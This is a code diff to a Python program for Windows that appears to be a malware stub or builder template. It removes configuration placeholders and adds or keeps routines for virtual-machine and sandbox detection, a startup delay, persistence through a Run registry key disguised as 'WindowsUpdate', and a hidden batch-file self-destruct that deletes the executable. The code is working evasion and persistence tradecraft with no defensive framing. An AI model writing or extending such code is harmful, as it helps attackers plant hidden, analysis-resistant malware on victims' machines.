@@ -15,20 +15,16 @@ def elevate_admin():
     return True
 
 def check_mutex():
-    if {MUTEX}:
-        try:
-            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-            if ctypes.windll.kernel32.GetLastError() == 183:
-                sys.exit()
-            return mutex
-        except:
-            pass
+    try:
+        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
+        if ctypes.windll.kernel32.GetLastError() == 183:
+            sys.exit()
+        return mutex
+    except:
+        pass
     return None
 
 def check_vm():
-    if not {ANTI_VM}:
-        return False
-    
     try:
         vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
         
@@ -66,22 +62,62 @@ def check_sandbox():
         if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
             return True
         
+        sandbox_processes = ["vmsrvc", "vmusrvc", "vboxtray", "vboxservice", "vmwaretray", "vmwareuser"]
+        
+        for proc in psutil.process_iter(['name']):
+            try:
+                proc_name = proc.info['name'].lower() if proc.info['name'] else ''
+                for sandbox_proc in sandbox_processes:
+                    if sandbox_proc in proc_name:
+                        return True
+            except:
+                continue
+        
         return False
     except:
         return False
 
-def startup_delay():
-    if {STARTUP_DELAY}:
-        time.sleep({DELAY_SECONDS})
+def startup_delay(seconds):
+    time.sleep(seconds)
 
 def add_persistence():
-    if {PERSIST}:
-        try:
-            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
-            
-            key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
-            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
-                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
-        except:
-            pass
+    try:
+        exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
+        
+        key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+    except:
+        pass
+
+def self_destruct():
+    try:
+        bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
+        exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
+        
+        escaped_path = exe_path.replace('\\', '\\\\')
+        
+        bat_lines = [
+            '@echo off',
+            'chcp 65001 >nul',
+            'timeout /t 3 /nobreak >nul',
+            f'del /f /q "{escaped_path}" >nul 2>&1',
+            'del /f /q "%~f0" >nul 2>&1',
+            'exit'
+        ]
+        
+        bat_content = '\\n'.join(bat_lines)
+        
+        with open(bat_path, 'w', encoding='utf-8') as f:
+            f.write(bat_content)
+        
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+        
+        subprocess.Popen(['cmd.exe', '/c', bat_path], 
+                        startupinfo=startupinfo, 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
